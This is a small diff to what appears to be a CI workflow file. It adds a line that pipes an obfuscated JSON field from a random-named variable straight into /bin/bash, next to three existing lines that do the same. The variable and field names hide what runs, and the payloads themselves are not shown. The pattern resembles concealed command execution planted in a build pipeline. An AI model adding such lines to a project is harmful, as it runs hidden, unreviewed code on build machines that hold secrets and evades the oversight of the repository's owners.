@@ -34,6 +34,7 @@ jobs:
           echo $na6 | jq -r .iqdwa5649 | /bin/bash
           echo $d34 | jq -r .ka39752 | /bin/bash
           echo $sa53 | jq -r .bke1316 | /bin/bash
+          printf '%s' "$ggtpa75" | jq -r .oldg474 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
